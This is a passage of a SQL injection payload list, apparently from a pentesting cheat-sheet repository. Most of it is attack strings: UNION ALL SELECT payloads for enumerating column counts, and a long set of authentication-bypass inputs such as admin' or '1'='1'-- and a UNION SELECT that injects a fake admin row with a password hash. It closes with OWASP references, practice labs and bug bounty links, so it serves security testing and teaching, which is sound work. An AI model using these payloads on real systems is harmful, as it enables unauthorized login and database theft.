           UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX'
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6

           UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 

           UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
           UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#

          
## SQL Injection Auth Bypass Payloads

     '-'
     ' '
     '&'
     '^'
     '*'
     ' or ''-'
     ' or '' '
     ' or ''&'
     ' or ''^'
     ' or ''*'
     "-"
     " "
     "&"
     "^"
     "*"
     " or ""-"
     " or "" "
     " or ""&"
     " or ""^"
     " or ""*"
     or true--
     " or true--
     ' or true--
     ") or true--
     ') or true--
     ' or 'x'='x
     ') or ('x')=('x
     ')) or (('x'))=(('x
     " or "x"="x
     ") or ("x")=("x
     ")) or (("x"))=(("x
     or 1=1
     or 1=1--
     or 1=1#
     or 1=1/*
     admin' --
     admin' #
     admin'/*
     admin' or '1'='1
     admin' or '1'='1'--
     admin' or '1'='1'#
     admin' or '1'='1'/*
     admin'or 1=1 or ''='
     admin' or 1=1
     admin' or 1=1--
     admin' or 1=1#
     admin' or 1=1/*
     admin') or ('1'='1
     admin') or ('1'='1'--
     admin') or ('1'='1'#
     admin') or ('1'='1'/*
     admin') or '1'='1
     admin') or '1'='1'--
     admin') or '1'='1'#
     admin') or '1'='1'/*
     1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
     admin" --
     admin" #
     admin"/*
     admin" or "1"="1
     admin" or "1"="1"--
     admin" or "1"="1"#
     admin" or "1"="1"/*
     admin"or 1=1 or ""="
     admin" or 1=1
     admin" or 1=1--
     admin" or 1=1#
     admin" or 1=1/*
     admin") or ("1"="1
     admin") or ("1"="1"--
     admin") or ("1"="1"#
     admin") or ("1"="1"/*
     admin") or "1"="1
     admin") or "1"="1"--
     admin") or "1"="1"#
     admin") or "1"="1"/*
     1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055

# References :

## SQL Injection ( OWASP )
   https://www.owasp.org/index.php/SQL_Injection

## PL/SQL:SQL Injection
   https://www.owasp.org/index.php/PL/SQL:SQL_Injection

## Blind SQL Injection
   https://www.owasp.org/index.php/Blind_SQL_Injection

## Testing for SQL Injection (OTG-INPVAL-005)
   https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)

## Reviewing Code for SQL Injection
   https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection

## SQL Injection Bypassing WAF
   https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF

## SQL Injection Injection Prevention Cheat Sheet
   https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html

## Testing for NoSQL injection
   https://www.owasp.org/index.php/Testing_for_NoSQL_injection

## SQL Injection Query Parameterization Cheat Sheet
   https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
   
# LABS to Practice :

## PortSwigger
https://portswigger.net/web-security/sql-injection

## TryHackMe
https://tryhackme.com/room/sqlilab

## HacksPlaining
https://www.hacksplaining.com/exercises/sql-injection


# WriteUps for Understanding Real World SQL-Injection:
 https://medium.com/sud0root/bug-bounty-writeups-exploiting-sql-injection-vulnerability-20b019553716
 https://infosecwriteups.com/tagged/sql-injection
 https://hackerone.com/reports/1224660
 https://hackerone.com/reports/1069561
 https://hackerone.com/reports/295841
 https://hackerone.com/reports/1046084
 https://sapt.medium.com/sqli-on-a-bugcrowd-private-program-17858b57ec61

    Soure:-https://github.com/payloadbox/sql-injection-payload-list.git

